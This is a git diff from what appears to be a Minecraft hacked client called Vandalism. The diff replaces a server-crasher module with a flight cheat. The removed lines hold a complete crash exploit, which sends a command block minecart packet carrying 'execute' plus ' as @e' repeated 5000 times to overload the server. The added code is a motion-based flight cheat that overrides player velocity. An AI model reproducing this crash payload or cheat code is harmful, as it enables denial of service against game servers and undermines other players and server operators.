@@ -16,19 +16,38 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-package de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher;
+package de.nekosarekawaii.vandalism.feature.module.impl.movement.flight.impl;
 
 import de.nekosarekawaii.vandalism.Vandalism;
 import de.nekosarekawaii.vandalism.base.event.normal.player.PlayerUpdateListener;
+import de.nekosarekawaii.vandalism.base.value.impl.number.DoubleValue;
+import de.nekosarekawaii.vandalism.feature.module.impl.movement.flight.FlightModule;
 import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
-import net.minecraft.entity.Entity;
-import net.minecraft.entity.vehicle.CommandBlockMinecartEntity;
-import net.minecraft.network.packet.c2s.play.UpdateCommandBlockMinecartC2SPacket;
+import de.nekosarekawaii.vandalism.util.game.MovementUtil;
+import net.minecraft.util.math.Vec3d;
 
-public class CommandBlockMinecartModuleMode extends ModuleMulti<ServerCrasherModule> implements PlayerUpdateListener {
+public class MotionModuleMode extends ModuleMulti<FlightModule> implements PlayerUpdateListener {
 
-    public CommandBlockMinecartModuleMode(final ServerCrasherModule parent) {
-        super("Command Block Minecart", parent);
+    private final DoubleValue motionYOffset = new DoubleValue(
+            this,
+            "Motion Y Offset",
+            "The motion y offset of the motion flight.",
+            0.5,
+            0.1,
+            2.0
+    );
+
+    private final DoubleValue speed = new DoubleValue(
+            this,
+            "Speed",
+            "The speed amount of the motion flight.",
+            1.2,
+            1.0,
+            5.0
+    );
+
+    public MotionModuleMode() {
+        super("Motion");
     }
 
     @Override
@@ -43,20 +62,9 @@ public class CommandBlockMinecartModuleMode extends ModuleMulti<ServerCrasherMod
 
     @Override
     public void onPrePlayerUpdate(final PlayerUpdateEvent event) {
-        boolean found = false;
-        for (final Entity entity : this.mc.world.getEntities()) {
-            if (entity instanceof CommandBlockMinecartEntity) {
-                this.mc.getNetworkHandler().getConnection().send(new UpdateCommandBlockMinecartC2SPacket(
-                        entity.getId(),
-                        "execute" + " as @e".repeat(5000),
-                        true
-                ), null, true);
-                found = true;
-            }
-        }
-        if (found) {
-            this.parent.deactivate();
-        }
+        final Vec3d speedVelocity = MovementUtil.setSpeed(this.speed.getValue());
+        final double motionY = this.mc.options.jumpKey.isPressed() ? this.motionYOffset.getValue() : this.mc.options.sneakKey.isPressed() ? -this.motionYOffset.getValue() : 0;
+        this.mc.player.setVelocity(speedVelocity.x, motionY, speedVelocity.z);
     }
 
 }
